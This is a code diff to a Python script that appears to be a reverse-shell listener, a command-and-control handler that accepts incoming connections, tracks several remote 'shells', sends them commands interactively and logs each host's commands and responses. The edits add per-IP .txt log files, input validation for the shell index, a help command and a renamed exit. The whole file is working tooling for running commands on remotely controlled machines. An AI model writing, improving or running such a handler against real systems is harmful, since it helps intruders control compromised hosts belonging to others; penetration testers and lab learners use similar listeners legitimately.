@@ -22,7 +22,7 @@ def handle_connections():
         conn, addr = s.accept()
         log = f'[connection received {addr}]'
         print(f'\n{log}')
-        write_log(addr[0], log+'\n')
+        write_log(f'{addr[0]}.txt', log+'\n')
         shells.append({'addr': addr[0], 'port': addr[1], 'conn': conn})
 
 # cli funcs
@@ -40,12 +40,17 @@ def send_command(): # send a command to a shell
     cmd = cmd+'\n'
     shell['conn'].sendall(cmd.encode('utf-8'))
     resp = shell['conn'].recv(1024)
-    write_log(shell['addr'], cmd)
-    write_log(shell['addr'], resp.decode('utf-8'))
+    write_log(f'{shell["addr"]}.txt', cmd)
+    write_log(f'{shell["addr"]}.txt', resp.decode('utf-8'))
     print(resp.decode('utf-8'))
 
 def do_interactive():
-    shell_index = int(input('shell#> '))
+    shell_index = input('shell#> ')
+    # input validation
+    if not shell_index.isnumeric():
+        print(f'input must be a shell index')
+        return 1
+    shell_index = int(shell_index)
     if  0 > shell_index > len(shells)-1:
         print('invalid shell index')
         return -1
@@ -56,8 +61,8 @@ def do_interactive():
         cmd = cmd+'\n'
         shell['conn'].sendall(cmd.encode('utf-8'))
         resp = shell['conn'].recv(1024)
-        write_log(shell['addr'], cmd)
-        write_log(shell['addr'], resp.decode('utf-8'))
+        write_log(f'{shell["addr"]}.txt', cmd)
+        write_log(f'{shell["addr"]}.txt', resp.decode('utf-8'))
         print(resp.decode('utf-8'))
 
 # args
@@ -70,14 +75,19 @@ ip = '0.0.0.0'
 # start listener
 t = threading.Thread(target=handle_connections, daemon=True).start()
 
+def show_opts():
+    for opt in opts: print(f'{opt}')
+
 # cli
 opts = {
     'shells': show_shells,
     'send': send_command,
     'interactive': do_interactive,
-    'i': do_interactive, 
-    'exit': exit
+    'i': do_interactive,
+    'help': show_opts,
+    '.exit': exit
 }
+
 while True:
     cmd = input('> ')
     if cmd in opts: opts[cmd]()
